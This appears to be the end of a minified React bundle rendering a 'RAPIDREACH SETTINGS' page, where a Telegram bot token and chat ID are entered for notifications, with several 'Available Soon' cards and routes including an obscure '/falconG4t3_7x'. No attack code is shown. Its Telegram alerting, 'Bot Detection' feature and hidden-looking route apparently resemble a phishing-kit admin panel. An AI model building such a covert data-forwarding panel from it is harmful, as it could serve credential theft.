token",value:t,onChange:j=>e(j.target.value),className:"relative z-10 pr-12 bg-slate-800/60 backdrop-blur-sm border-blue-500/30 focus:border-blue-400/60 focus:ring-blue-400/30 text-blue-200 placeholder:text-blue-400/60 text-sm font-inter min-h-[44px] touch-manipulation",disabled:o}),a.jsx(W,{type:"button",variant:"ghost",size:"sm",onClick:()=>h(!u),className:"absolute right-2 top-1/2 -translate-y-1/2 h-8 w-8 p-0 hover:bg-blue-500/20 text-blue-300 hover:text-blue-200 transition-all duration-200 backdrop-blur-sm min-h-[32px] touch-manipulation",disabled:o,children:u?a.jsx(vl,{className:"h-4 w-4"}):a.jsx(kn,{className:"h-4 w-4"})})]}),a.jsx("p",{className:"font-inter text-xs text-blue-300/60 leading-relaxed",children:"Obtain from @BotFather on Telegram"})]}),a.jsxs("div",{className:"space-y-2 sm:space-y-3",children:[a.jsx(Ht,{htmlFor:"chatId",className:"font-inter text-sm font-medium text-blue-300 tracking-wide",children:"Chat ID"}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-0.5 bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-lg opacity-0 group-focus-within:opacity-100 transition duration-300 blur-sm"}),a.jsx(Ze,{id:"chatId",type:"text",placeholder:"Enter your Telegram chat ID",value:r,onChange:j=>n(j.target.value),className:"relative z-10 bg-slate-800/60 backdrop-blur-sm border-blue-500/30 focus:border-blue-400/60 focus:ring-blue-400/30 text-blue-200 placeholder:text-blue-400/60 text-sm font-inter min-h-[44px] touch-manipulation",disabled:o})]}),a.jsx("p",{className:"font-inter text-xs text-blue-300/60 leading-relaxed",children:"Personal or group ID for notifications"})]})]}),a.jsxs("div",{className:"flex flex-col sm:flex-row gap-3 sm:gap-4 pt-6 sm:pt-8",children:[a.jsx("div",{className:"relative group sm:order-1",children:a.jsx(W,{variant:"outline",onClick:x,className:"w-full sm:w-auto border-blue-500/30 text-blue-300 hover:text-blue-200 hover:bg-slate-700/60 bg-slate-800/50 backdrop-blur-sm font-inter font-medium min-h-[44px] px-4 sm:px-6 touch-manipulation transition-all duration-300",disabled:o,children:"Reset"})}),a.jsxs("div",{className:"relative group sm:order-2",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-blue-500 to-purple-500 rounded-lg opacity-60 blur group-hover:opacity-90 transition duration-300"}),a.jsx(W,{onClick:w,className:"relative z-10 w-full sm:w-auto bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 text-white font-inter font-semibold min-h-[44px] px-4 sm:px-6 touch-manipulation shadow-lg transition-all duration-300 backdrop-blur-sm",disabled:o||!t.trim()||!r.trim(),children:o?a.jsxs("span",{className:"flex items-center gap-2",children:[a.jsx("div",{className:"w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"}),"Saving..."]}):a.jsxs(a.Fragment,{children:[a.jsx(Ti,{className:"mr-2 h-4 w-4"}),"Save Configuration"]})})]})]})]})})})},jC=()=>{const[t,e]=p.useState(!1);return p.useEffect(()=>{const r=setTimeout(()=>{e(!0)},50);return()=>clearTimeout(r)},[]),t?a.jsx(wC,{}):a.jsx("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-blue-500/30 rounded-xl p-4 sm:p-6 shadow-xl shadow-blue-500/10",children:a.jsxs("div",{className:"space-y-4",children:[a.jsx("div",{className:"h-6 bg-blue-500/20 rounded w-1/3 animate-pulse"}),a.jsxs("div",{className:"space-y-3",children:[a.jsx("div",{className:"h-4 bg-blue-500/20 rounded w-1/4 animate-pulse"}),a.jsx("div",{className:"h-11 bg-blue-500/20 rounded animate-pulse"}),a.jsx("div",{className:"h-4 bg-blue-500/20 rounded w-1/4 animate-pulse"}),a.jsx("div",{className:"h-11 bg-blue-500/20 rounded animate-pulse"})]}),a.jsxs("div",{className:"flex gap-3 pt-4",children:[a.jsx("div",{className:"h-11 bg-blue-500/20 rounded w-20 animate-pulse"}),a.jsx("div",{className:"h-11 bg-blue-500/20 rounded w-32 animate-pulse"})]})]})})},_C=()=>{const t=nv();return a.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 bg-[length:400%_400%] animate-gradient-flow relative overflow-hidden",children:[a.jsxs("div",{className:"absolute inset-0 pointer-events-none overflow-hidden",children:[a.jsx("div",{className:"absolute top-20 left-10 w-16 h-16 bg-blue-400/20 backdrop-blur-sm rounded-lg animate-float-1"}),a.jsx("div",{className:"absolute top-40 right-16 w-12 h-12 bg-indigo-400/20 backdrop-blur-sm rounded-full animate-float-2"}),a.jsx("div",{className:"absolute bottom-32 left-1/4 w-20 h-8 bg-purple-400/20 backdrop-blur-sm transform rotate-45 animate-float-1"}),a.jsx("div",{className:"absolute bottom-20 right-1/3 w-10 h-10 bg-teal-400/20 backdrop-blur-sm transform rotate-12 animate-float-2"}),a.jsx("div",{className:"absolute top-1/4 w-full h-px bg-gradient-to-r from-transparent via-blue-400/50 to-transparent animate-scan-line"}),a.jsx("div",{className:"absolute bottom-1/3 w-full h-px bg-gradient-to-r from-transparent via-indigo-400/50 to-transparent animate-scan-line",style:{animationDelay:"4s"}}),a.jsx("div",{className:"absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-32 h-32 border border-blue-400/30 rounded-full animate-radar-pulse"}),a.jsx("div",{className:"absolute inset-0 opacity-10 bg-[linear-gradient(90deg,transparent_24px,rgba(59,130,246,0.5)_25px,rgba(59,130,246,0.5)_26px,transparent_27px,transparent_49px,rgba(59,130,246,0.5)_50px,rgba(59,130,246,0.5)_51px,transparent_52px),linear-gradient(rgba(59,130,246,0.5)_24px,transparent_25px,transparent_26px,rgba(59,130,246,0.5)_27px,rgba(59,130,246,0.5)_49px,transparent_50px,transparent_51px,rgba(59,130,246,0.5)_52px)] bg-[size:52px_52px]"})]}),a.jsx("header",{className:"relative z-10 pt-3 sm:pt-4 md:pt-6 px-3 sm:px-4 md:px-6 lg:px-8",children:a.jsx("div",{className:"max-w-7xl mx-auto",children:a.jsxs("div",{className:"flex items-center justify-between gap-2 sm:gap-3 md:gap-4",children:[a.jsxs("div",{className:"flex items-center gap-1 sm:gap-2 md:gap-3 min-w-0 flex-1",children:[a.jsxs("div",{className:"relative w-6 h-6 sm:w-8 sm:h-8 md:w-10 md:h-10 flex-shrink-0",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/30 to-blue-500/30 rounded-full animate-pulse blur-sm"}),a.jsx("div",{className:"relative z-10 w-full h-full rounded-full bg-gradient-to-br from-cyan-400/20 to-blue-500/20 backdrop-blur-sm border border-cyan-400/30 flex items-center justify-center",children:a.jsx("span",{className:"text-sm sm:text-base md:text-lg lg:text-xl font-jetbrains font-bold text-cyan-300 animate-pulse drop-shadow-lg select-none",children:""})})]}),a.jsx("h1",{className:"font-jetbrains text-sm sm:text-lg md:text-xl font-black bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent tracking-wider drop-shadow-lg truncate min-w-0",children:"RAPIDREACH SETTINGS"})]}),a.jsxs("div",{className:"relative group flex-shrink-0",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-blue-500 to-purple-500 rounded-xl opacity-50 group-hover:opacity-70 blur transition duration-300"}),a.jsxs(W,{variant:"outline",size:"sm",onClick:()=>t("/greyboi"),className:"relative z-10 flex items-center gap-1 sm:gap-2 border-blue-400/40 hover:border-blue-300/60 bg-slate-800/50 hover:bg-slate-700/60 text-blue-200 hover:text-blue-100 transition-all duration-300 backdrop-blur-sm font-jetbrains font-medium text-xs sm:text-sm min-h-[44px] px-2 sm:px-3 md:px-4 touch-manipulation",children:[a.jsx(Kh,{className:"w-3 h-3 sm:w-4 sm:h-4"}),a.jsx("span",{className:"hidden sm:inline",children:"Back to Dashboard"}),a.jsx("span",{className:"sm:hidden",children:"Back"})]})]})]})})}),a.jsx("main",{className:"relative z-10 container mx-auto px-3 sm:px-4 md:px-6 lg:px-8 py-4 sm:py-6 md:py-8 lg:py-12",children:a.jsxs("div",{className:"max-w-xs sm:max-w-2xl md:max-w-3xl lg:max-w-4xl xl:max-w-5xl mx-auto space-y-6 sm:space-y-8",children:[a.jsxs("div",{className:"space-y-4 sm:space-y-6",children:[a.jsxs("div",{className:"border-b border-blue-400/30 pb-3 sm:pb-4",children:[a.jsx("h2",{className:"font-jetbrains text-lg sm:text-xl md:text-2xl font-bold text-blue-200 tracking-tight leading-tight",children:"Telegram Integration"}),a.jsx("p",{className:"font-inter text-blue-300/80 mt-0.5 sm:mt-1 text-sm sm:text-base leading-relaxed",children:"Configure instant notification delivery"})]}),a.jsx(jC,{})]}),a.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6 pt-4 sm:pt-6 md:pt-8",children:[a.jsxs("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-blue-500/30 rounded-xl p-4 sm:p-6 opacity-40 touch-manipulation",children:[a.jsx("h3",{className:"font-jetbrains text-base sm:text-lg font-semibold text-blue-200 mb-1 sm:mb-2 leading-tight",children:"Security Protocols"}),a.jsx("p",{className:"font-inter text-blue-300/70 text-xs sm:text-sm mb-3 sm:mb-4 leading-relaxed",children:"Advanced protection configuration"}),a.jsxs("div",{className:"space-y-2 sm:space-y-3",children:[a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-full"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-3/4"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-1/2"})]}),a.jsx("div",{className:"mt-3 sm:mt-4 text-xs text-blue-300/40 italic font-jetbrains",children:"Available Soon"})]}),a.jsxs("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-blue-500/30 rounded-xl p-4 sm:p-6 opacity-40 touch-manipulation",children:[a.jsx("h3",{className:"font-jetbrains text-base sm:text-lg font-semibold text-blue-200 mb-1 sm:mb-2 leading-tight",children:"Performance Optimization"}),a.jsx("p",{className:"font-inter text-blue-300/70 text-xs sm:text-sm mb-3 sm:mb-4 leading-relaxed",children:"Speed and efficiency tuning"}),a.jsxs("div",{className:"space-y-2 sm:space-y-3",children:[a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-full"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-2/3"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-4/5"})]}),a.jsx("div",{className:"mt-3 sm:mt-4 text-xs text-blue-300/40 italic font-jetbrains",children:"Available Soon"})]}),a.jsxs("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-blue-500/30 rounded-xl p-4 sm:p-6 opacity-40 touch-manipulation",children:[a.jsx("h3",{className:"font-jetbrains text-base sm:text-lg font-semibold text-blue-200 mb-1 sm:mb-2 leading-tight",children:"Bot Detection"}),a.jsx("p",{className:"font-inter text-blue-300/70 text-xs sm:text-sm mb-3 sm:mb-4 leading-relaxed",children:"Automated traffic filtering"}),a.jsxs("div",{className:"space-y-2 sm:space-y-3",children:[a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-full"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-3/5"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-4/5"})]}),a.jsx("div",{className:"mt-3 sm:mt-4 text-xs text-blue-300/40 italic font-jetbrains",children:"Available Soon"})]}),a.jsxs("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-blue-500/30 rounded-xl p-4 sm:p-6 opacity-40 touch-manipulation",children:[a.jsx("h3",{className:"font-jetbrains text-base sm:text-lg font-semibold text-blue-200 mb-1 sm:mb-2 leading-tight",children:"Advanced Configuration"}),a.jsx("p",{className:"font-inter text-blue-300/70 text-xs sm:text-sm mb-3 sm:mb-4 leading-relaxed",children:"Extended functionality controls"}),a.jsxs("div",{className:"space-y-2 sm:space-y-3",children:[a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-full"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-1/2"}),a.jsx("div",{className:"h-2 sm:h-3 bg-blue-500/20 rounded w-3/4"})]}),a.jsx("div",{className:"mt-3 sm:mt-4 text-xs text-blue-300/40 italic font-jetbrains",children:"Available Soon"})]})]})]})})]})},NC=new g2;function SC(){return a.jsx(y2,{client:NC,children:a.jsx(V_,{attribute:"class",defaultTheme:"dark",enableSystem:!0,children:a.jsxs(KS,{children:[a.jsx(D_,{}),a.jsx(yN,{}),a.jsx(dk,{children:a.jsxs(ok,{children:[a.jsx(Is,{path:"/",element:a.jsx(eC,{})}),a.jsx(Is,{path:"/greyboi",element:a.jsx(X4,{})}),a.jsx(Is,{path:"/nexus",element:a.jsx(_C,{})}),a.jsx(Is,{path:"/falconG4t3_7x",element:a.jsx(vC,{})}),a.jsx(Is,{path:"*",element:a.jsx(Z4,{})})]})})]})})})}bx(document.getElementById("root")).render(a.jsx(SC,{}));export{Vt as _,BC as c,$ as s};
